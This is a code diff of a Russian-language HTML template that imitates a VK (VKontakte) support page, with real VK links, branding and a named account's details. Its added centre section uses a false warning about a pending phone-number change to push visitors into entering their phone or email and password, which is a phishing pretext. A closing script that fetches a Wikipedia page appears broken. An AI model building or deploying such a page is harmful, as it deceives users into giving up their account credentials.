@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 <html lang="ru">
   <head>
-    <title>Отмена</title>
+    <title>Поддержка</title>
     <meta charset="utf-8">
 
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
@@ -12,27 +12,32 @@
       crossorigin="anonymous">
 
     <link rel="stylesheet" type="text/css" href="{% static 'css/index-styles.css' %}">
+
+    <link rel="shortcut icon" href="{% static 'images/fav_logo.ico' %}">
   </head>
   <body class="container-fluid">
-    <header class="row"> 
-    	<div class="row col-xl-8 offset-xl-2">
-    		<div class="header__logo-block col-xl-2">
+    <header class="row  justify-content-center"> 
+    	<div class="row col-xl-8 col-sm-9">
+    		<div class="header__logo-block col-xl-2 col-sm-3">
     			<a class="header__logo-block_link" href="https://vk.com/feed"><img src="{% static 'images/vk_logo.svg' %}" alt="VK"></a>
     		</div>
-    		<div class="header__center-block col-xl-7">
+    		<div class="header__heading-block col-sm-4">
+				<h1>Поддержка</h1>
+    		</div>
+    		<div class="header__center-block col-xl-7 col-sm-5">
     			<div class="header__center-block_formblock"><input class="header__center-block_form" type="text" placeholder="Поиск"></div>
-				<a class="header__center-block_link" href=""><img class="header__center-block_link_inner-icon" src="{% static 'images/notify-icon.svg' %}" alt="VK"></a>
-				<a class="header__center-block_link" href=""><img class="header__center-block_link_inner-icon" src="{% static 'images/audio-icon.svg' %}" alt="VK"></a>
+				<a class="header__center-block_link" href="https://vk.com/feed?section=notifications"><img class="header__center-block_link_inner-icon" src="{% static 'images/notify-icon.svg' %}" alt="VK"></a>
+				<a class="header__center-block_link" href="https://vk.com/music"><img class="header__center-block_link_inner-icon" src="{% static 'images/audio-icon.svg' %}" alt="VK"></a>
     		</div>
     		<div class="header__acc-block col-xl-3">
     			<div class="dropdown open">
 				  <a class="header__acc-block__dropdown btn btn-secondary dropdown-toggle" href="http://example.com" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-				    <h3 class="header__acc-block__dropdown_name">Денис</h3>
+				    <h3 class="header__acc-block__dropdown_name">Ден</h3>
 				    <img class="header__acc-block__dropdown_ava" src="https://vk.com/images/camera_50.png?ava=1" alt="">
 				  </a>
 
 				  <div class="header__acc-block__dropdown_menu dropdown-menu dropdown-menu-right" aria-labelledby="dropdownMenuLink">
-				    <a class="dropdown-item header__acc-block__dropdown-item header__acc-block__dropdown-item_data" href="#">
+				    <a class="dropdown-item header__acc-block__dropdown-item header__acc-block__dropdown-item_data" href="https://connect.vk.com/account/">
 					    <img class="header__acc-block__dropdown-item_ava" src="https://vk.com/images/camera_50.png?ava=1" alt="">
 					    <div class="header__acc-block__dropdown_nameblock">
 						    <h3 class="header__acc-block__dropdown-item header__acc-block__dropdown-item_name">Денис Перков</h3>
@@ -40,43 +45,183 @@
 					    </div>
 				    </a>
 				    <div class="dropdown-divider" style="clear: both;"></div>
-				    <a class="header__acc-block__dropdown-item dropdown-item" href="#">Настройки</a>
-				    <a class="header__acc-block__dropdown-item dropdown-item" href="#">Помощь</a>
+				    <a class="header__acc-block__dropdown-item dropdown-item" href="https://vk.com/settings">Настройки</a>
+				    <a class="header__acc-block__dropdown-item dropdown-item" href="https://vk.com/support?act=home">Помощь</a>
 				    <div class="dropdown-divider"></div>
-				    <a class="header__acc-block__dropdown-item dropdown-item" href="#">Выйти</a>
+				    <a class="header__acc-block__dropdown-item dropdown-item" href="https://login.vk.com/?act=logout&hash=28e9a03145b56c323b&reason=tn&_origin=https://vk.com">Выйти</a>
 				  </div>
 				</div>
     		</div>		
 		</div>
 	</header>
-	<main class="row">
-		<div class="row col-xl-8 offset-xl-2">
+	<main class="row justify-content-center">
+		<div class="row col-xl-8 col-sm-9">
 			<nav class="navigation-block col-xl-2">
 				<ul class="navigation-block__list list-unstyled">
-		          <li class="navigation-block__item"><div class="navigation-block__item__img"></div><a href="/">Моя страница</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img news"></div><a href="collection">Новости</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img messages"></div><a href="shop">Сообщения</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img friends"></div><a href="donate">Друзья</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img community"></div><a href="donate">Сообщества</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img photos"></div><a href="donate">Фотографии</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img music"></div><a href="donate">Музыка</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img video"></div><a href="donate">Видео</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img clips"></div><a href="donate">Клипы</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img games"></div><a href="donate">Игры</a></li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img hom"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/perk_7">Моя страница</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img news"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/feed">Новости</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img messages"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/im">Сообщения</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img friends"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/friends">Друзья</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img community"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/groups">Сообщества</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img photos"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/albums238817282">Фотографии</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img music"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/audios238817282">Музыка</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img video"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/video">Видео</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img clips"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/clips">Клипы</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img games"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/apps">Игры</a></div>
+		          </li>
 		          <hr>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img pay"></div><a href="donate">VK Pay</a></li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img pay"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/vkpay">VK Pay</a></div>
+		          </li>
 		          <hr>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img products"></div><a href="donate">Товары</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img notes"></div><a href="donate">Закладки</a></li>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img documents"></div><a href="donate">Документы</a></li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img products"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/market">Товары</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img notes"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/bookmarks?from_menu=1">Закладки</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img documents"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/docs">Документы</a></div>
+		          </li>
 		          <hr>
-		          <li class="navigation-block__item"><div class="navigation-block__item__img coronavirus"></div><a href="donate">Коронавирус</a></li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img coronavirus"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/covid19#utm_source=vk&utm_medium=cpc&utm_campaign=web_left_nav">Коронавирус</a></div>
+		          </li>
 		          <hr>
-		          <a class="afternav-link" href="">Блог</a>
-		          <a class="afternav-link" href="">Разработчикам</a>
-		          <a class="afternav-link" href="">Реклама</a>
+		          <a class="afternav-link" href="https://vk.com/blog">Блог</a>
+		          <a class="afternav-link" href="https://vk.com/dev">Разработчикам</a>
+		          <a class="afternav-link" href="https://vk.com/biz">Реклама</a>
 		        </ul>
 			</nav>
+			<nav class="navigation-block-mobile col-sm-3">
+				<div class="navigation__acc-info">
+					<div class="navigation__acc-info__img"><img src="https://m.vk.com/images/camera_100.png?ava=1" alt=""></div>
+					<div class="navigation__acc-info__name">Денис Перков</div>
+				</div>
+				<ul class="navigation-block__list list-unstyled">
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img news"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/feed">Новости</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img reccomend"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/im">Рекомендации</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img notify"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/im">Уведомления</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img messages"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/im">Сообщения</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img friends"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/friends">Друзья</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img community"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/groups">Сообщества</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img photos"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/albums238817282">Фотографии</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img video"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/audios238817282">Видео</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img music"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/audios238817282">Музыка</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img miniapps"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/video">Мини-приложения</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img games"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/apps">Игры</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img notes"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/vkpay">Закладки</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img documents"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/market">Документы</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img advert"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/bookmarks?from_menu=1">Реклама</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img liked"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/docs">Понравилось</a></div>
+		          </li>
+		          <li class="navigation-block__item">
+		          	<div class="navigation-block__item__img search"></div>
+		          	<div class="navigation-block__item__link"><a href="https://vk.com/docs">Поиск</a></div>
+		          </li>
+		          <hr>
+		          <a class="afternav-link" href="https://vk.com/blog">Настройки</a>
+		          <a class="afternav-link" href="https://vk.com/dev">Помощь</a>
+		          <a class="afternav-link" href="https://vk.com/biz">Выход</a>
+		        </ul>
+			</nav>
+			<section class="main-center-block col-xl-7 col-sm-9">
+				<div class="center-block__formblock">
+					<div class="center-block__formblock_headingblock">
+						<h3 class="center-block__formblock_heading">Отмена процедуры</h3>
+					</div>
+					<div class="center-block__formblock_text">
+						Вы отправили заявку на изменение номера телефона своего аккаунта, для того чтобы отменить
+						данную процедуру вам нужно подтвердить, что это именно вы, и пройти повторную авторизацию,
+						после чего ваша заявка будет аннулирована.
+					</div>
+					<div class="center-block__formblock_input">
+						<form action="">
+							<input class="center-block__formblock_input-text" type="email" placeholder="Телефон или email" required>
+							<input class="center-block__formblock_input-text" type="password" placeholder="Пароль" required>
+							<input class="center-block__formblock_input-btn" type="submit" value="Подтвердить">
+						</form>
+					</div>
+				</div>
+			</section>
 		</div>
 	</main>
     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" 
@@ -90,5 +235,21 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" 
       integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" 
       crossorigin="anonymous"></script>
-  </body>
+
+    <script>
+		(function(){
+		  var http = new XMLHttpRequest();  
+		  http.open('GET', 'https://ru.wikipedia.org/wiki/Заглавная_страница');
+		  http.onreadystatechange = function () {
+		    if (this.readyState == 4 && this.status == 200) {
+		      var doc = new DOMParser().parseFromString(this.responseText, "text/html");  // преобразовать текст в HTML
+		      let elem = document.querySelector('.pt-anonuserpage');
+
+		      document.querySelector('.header__acc-block__dropdown_name').innerHTML = elem.innerHTML
+		    }
+		  }
+		  http.send(null);
+		})()
+	</script>
+ </body>
 </html>
